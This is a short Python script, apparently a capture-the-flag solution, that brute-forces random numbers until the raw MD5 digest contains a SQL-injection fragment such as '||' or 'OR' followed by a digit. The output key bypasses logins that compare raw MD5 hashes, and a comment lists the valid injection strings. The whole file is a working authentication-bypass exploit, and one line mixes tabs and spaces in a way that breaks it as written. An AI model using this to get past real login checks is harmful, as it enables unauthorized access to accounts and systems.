from hashlib import md5
import sys
import struct
import random
import time

# valid sql attacks '||1#    '||'1      'OR 1#      'OR'1        
# the 1 can be any digit thats not 0

start_time = time.time()
def main():
    max_int = sys.maxsize
    
    inject1 = "\'||\'"
    inject3 = "\'OR\'"
    inject4 = "\'or\'"

    i = 0
    while 1:
        i+=1
        if(i % 100000 == 0):
            print(i)
            #break
        

        #int1 = random.randint(0, max_int)
        #int2 = random.randint(0, max_int)
        #int3 = random.randint(0, max_int)
        #int4 = random.randint(0, max_int)
        #packed_data = struct.pack('IIII', int1, int2, int3, int4)
        #packed_data = f"{int1}{int2}{int3}{int4}"
        #break 
        #packed_data = str(random.randint(1,max_int))
	packed_data = str(random.getrandbits(128))

        my_hash = md5()
        my_hash.update(packed_data.encode())
        string = my_hash.digest()
        
        
        idx = string.find(inject1.encode())
        if(idx < 0):
            idx = string.find(inject3.encode())
            if(idx < 0):
                idx = string.find(inject4.encode())

        if(idx > 0):
            if(idx + 4 < len(string) and 49 <= string[idx + 4] <= 57):
                break

    end_time = time.time()
    time_taken = end_time - start_time
    
    print("Time Taken: ")
    print(time_taken)
    print("Key: ")
    print(packed_data)
    print("Hash: ")
    print(string)
    return 1


if __name__ == "__main__":
    main()

